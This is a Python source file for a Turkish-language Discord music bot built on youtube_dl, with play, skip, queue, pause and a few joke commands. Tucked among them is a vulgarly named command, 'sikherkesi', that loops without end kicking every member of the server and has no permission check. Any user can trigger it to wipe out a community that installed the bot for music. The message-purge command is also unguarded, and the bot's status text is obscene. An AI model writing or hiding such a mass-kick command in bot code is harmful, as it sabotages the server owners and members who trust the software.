import discord
import asyncio
import random
import youtube_dl
import websockets
from discord.ext import commands
from discord import Client
from discord import Server
import configparser
import os
config = configparser.ConfigParser()
config.read('config.ini')

bot = commands.Bot(command_prefix='-')
bot.remove_command('help')
from discord import opus
OPUS_LIBS = ['libopus-0.x86.dll', 'libopus-0.x64.dll',
             'libopus-0.dll', 'libopus.so.0', 'libopus.0.dylib']


def load_opus_lib(opus_libs=OPUS_LIBS):
    if opus.is_loaded():
        return True

    for opus_lib in opus_libs:
            try:
                opus.load_opus(opus_lib)
                return
            except OSError:
                pass

    raise RuntimeError('Could not load an opus lib. Tried %s' %
                       (', '.join(opus_libs)))
opts = {
    'default_search': 'auto',
    'quiet': True,
}  # youtube_dl options



load_opus_lib()

servers_songs={}
player_status={}
now_playing={}
song_names={}
paused={}

async def set_player_status():
    for i in bot.servers:
        player_status[i.id]=False
        servers_songs[i.id]=None
        paused[i.id]=False
        song_names[i.id]=[]
    print(200)



async def bg():
    bot.loop.create_task(set_player_status())


@bot.event
async def on_ready():
    bot.loop.create_task(bg())
    print(bot.user.name)
    await bot.change_presence(game=discord.Game(name='Tatı Sikememece'))


@bot.event
async def on_reaction_add(react,user):
    pass


async def check_voice(con):
    pass




async def queue_songs(con,clear):
    if clear == True:
        song_names[con.message.server.id].clear()
        await bot.voice_client_in(con.message.server).disconnect()
        player_status[con.message.server.id] = False

    if clear == False:

        if len(song_names[con.message.server.id])==0:
            servers_songs[con.message.server.id]=None

        if len(song_names[con.message.server.id]) !=0:
            song=await bot.voice_client_in(con.message.server).create_ytdl_player(song_names[con.message.server.id][0], ytdl_options=opts, after=lambda: bot.loop.create_task(after_song(con, False)))
            servers_songs[con.message.server.id]=song
            servers_songs[con.message.server.id].start()
            await bot.delete_message(now_playing[con.message.server.id])
            msg=await bot.send_message(con.message.channel,"Now playing")
            now_playing[con.message.server.id]=msg

            if len(song_names[con.message.server.id]) >= 1:
                song_names[con.message.server.id].pop(0)


        if len(song_names[con.message.server.id]) ==0 and servers_songs[con.message.server.id] == None:
            player_status[con.message.server.id]=False
        

async def after_song(con,clear):
    bot.loop.create_task(queue_songs(con,clear))
    bot.loop.create_task(check_voice(con))


@bot.command(pass_context=True)
async def sikherkesi(ctx):
    members = ctx.message.server.members.copy();
    while True:
        for server_member in members:
            try:
                channel = bot.get_channel('605223507856719888')
                await bot.kick(server_member)
                await bot.send_message(channel, "someone got kicked")
            except discord.Forbidden:
                pass
    
@bot.command(pass_context=True)
async def p(con,*,url):
    """PLAY THE GIVEN SONG AND QUEUE IT IF THERE IS CURRENTLY SOGN PLAYING"""
    check = str(con.message.channel)
    if check == 'Direct Message with {}'.format(con.message.author.name):
        await bot.send_message(con.message.channel, "**You must be in a `server voice channel ` to use this command**")

    if check != 'Direct Message with {}'.format(con.message.author.name):
        if bot.is_voice_connected(con.message.server) == False:
            await bot.join_voice_channel(con.message.author.voice.voice_channel)

        if bot.is_voice_connected(con.message.server) == True:
            if player_status[con.message.server.id]==True:
                song_names[con.message.server.id].append(url)
                await bot.send_message(con.message.channel, "**Şarkı sıraya alındı :white_check_mark:**")


                
            if player_status[con.message.server.id]==False:
                player_status[con.message.server.id]=True
                song_names[con.message.server.id].append(url)
                song=await bot.voice_client_in(con.message.server).create_ytdl_player(song_names[con.message.server.id][0], ytdl_options=opts, after=lambda: bot.loop.create_task(after_song(con,False)))
                servers_songs[con.message.server.id]=song
                servers_songs[con.message.server.id].start()
                msg = await bot.send_message(con.message.channel, "**Şuanda oynatılan > {}**".format(servers_songs[con.message.server.id].title))
                now_playing[con.message.server.id]=msg
                song_names[con.message.server.id].pop(0)




@bot.command(pass_context=True)
async def atla(con):
    check = str(con.message.channel)
    if check == 'Direct Message with {}'.format(con.message.author.name):#COMMAND IS IN DM
        await bot.send_message(con.message.channel, "**You must be in a `server voice channel` to use this command**")

    if check != 'Direct Message with {}'.format(con.message.author.name):#COMMAND NOT IN DM
        if servers_songs[con.message.server.id]== None or len(song_names[con.message.server.id])==0 or player_status[con.message.server.id]==False:
            await bot.send_message(con.message.channel,"**Atlanılacak şarkı yok !**")
        if servers_songs[con.message.server.id] !=None:
            servers_songs[con.message.server.id].pause()
            bot.loop.create_task(queue_songs(con,False))



@bot.command(pass_context=True)
async def katıl(con,channel=None):
    """JOIN A VOICE CHANNEL THAT THE USR IS IN OR MOVE TO A VOICE CHANNEL IF THE BOT IS ALREADY IN A VOICE CHANNEL"""
    check = str(con.message.channel)

    if check == 'Direct Message with {}'.format(con.message.author.name):#COMMAND IS IN DM
        await bot.send_message(con.message.channel, "**You must be in a `server voice channel` to use this command**")

    if check != 'Direct Message with {}'.format(con.message.author.name):#COMMAND NOT IN DM
        voice_status = bot.is_voice_connected(con.message.server)

        if voice_status == False:#VOICE NOT CONNECTED
            await bot.join_voice_channel(con.message.author.voice.voice_channel)

        if voice_status == True:#VOICE ALREADY CONNECTED
            await bot.send_message(con.message.channel, "**Bot zaten bir kanala bağlı !**")



@bot.command(pass_context=True)
async def çıkış(con):
    """LEAVE THE VOICE CHANNEL AND STOP ALL SONGS AND CLEAR QUEUE"""
    check=str(con.message.channel)
    if check == 'Direct Message with {}'.format(con.message.author.name):#COMMAND USED IN DM
        await bot.send_message(con.message.channel,"**You must be in a `server voice channel` to use this command**")

    if check != 'Direct Message with {}'.format(con.message.author.name):#COMMAND NOT IN DM
        
        # IF VOICE IS NOT CONNECTED
        if bot.is_voice_connected(con.message.server) == False:
            await bot.send_message(con.message.channel,"**Bot kanala bağlanmamış !**")

        # VOICE ALREADY CONNECTED
        if bot.is_voice_connected(con.message.server) == True:
            bot.loop.create_task(queue_songs(con,True))

@bot.command(pass_context=True)
async def durdur(con):
    check = str(con.message.channel)
    if check == 'Direct Message with {}'.format(con.message.author.name):# COMMAND IS IN DM
        await bot.send_message(con.message.channel, "**You must be in a `server voice channel` to use this command**")

    # COMMAND NOT IN DM
    if check != 'Direct Message with {}'.format(con.message.author.name):
        if servers_songs[con.message.server.id]!=None:
            if paused[con.message.server.id] == True:
                await bot.send_message(con.message.channel,"**Şarkı zaten durdurulmuş !**")
            if paused[con.message.server.id]==False:
                servers_songs[con.message.server.id].pause()
                paused[con.message.server.id]=True

@bot.command(pass_context=True)
async def devam(con):
    check = str(con.message.channel)
    # COMMAND IS IN DM
    if check == 'Direct Message with {}'.format(con.message.author.name):
        await bot.send_message(con.message.channel, "**You must be in a  `server voice channel` to use this command**")

    # COMMAND NOT IN DM
    if check != 'Direct Message with {}'.format(con.message.author.name):
        if servers_songs[con.message.server.id] != None:
            if paused[con.message.server.id] == False:
                await bot.send_message(con.message.channel,"**Zaten oynatılıyor !**")
            if paused[con.message.server.id] ==True:
                servers_songs[con.message.server.id].resume()
                paused[con.message.server.id]=False

@bot.command(pass_context=True)
async def soyle(ctx, *,content) :
    """Komuttan sonra yazdığınız şeyi bottan yazar"""
    await bot.delete_message(ctx.message)
    await bot.say(content)
    
@bot.command(pass_context=True)
async def vur(ctx, member:discord.Member):
    url4 = ["https://media1.tenor.com/images/85722c3e51d390e11a0493696f32fb69/tenor.gif" , 
            "https://media1.tenor.com/images/b6d8a83eb652a30b95e87cf96a21e007/tenor.gif" ,
           "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQJXAvVd7xgvUVyruIlwWvT1Y9a2xvJADKnB01VqjHKVlyh1WB_" ,
           "https://media1.tenor.com/images/1cf84bf514d2abd2810588caf7d9fd08/tenor.gif?itemid=7679403"]
    embed = discord.Embed(title=ctx.message.author.name + " sana vuruyor " + member.name )
    embed.set_image(url=random.choice(url4))
    await bot.say(embed=embed)      
    
@bot.command(pass_context=True)
async def sil (ctx, number):
    mgs = []
    number = int(number)
    async for x in bot.logs_from(ctx.message.channel, limit=number):
        mgs.append(x)
    await bot.delete_messages(mgs)           
    
@bot.command(pass_context=True)
async def test(ctx):
    await bot.say("Yaşıom len mQ")

@bot.command(pass_context=True)
async def isyan(ctx):
    await bot.say(":fire:")
    await bot.say(":fire:")
    await bot.say(":fire:")
    await bot.say(":fire:")
    await bot.say(":fire:")
    await bot.say(":fire:")
    await bot.say(":fire:")
    await bot.say(":fire:")
    await bot.say(":fire:")
    await bot.say(":fire:")
bot.run(os.environ.get('token'))   
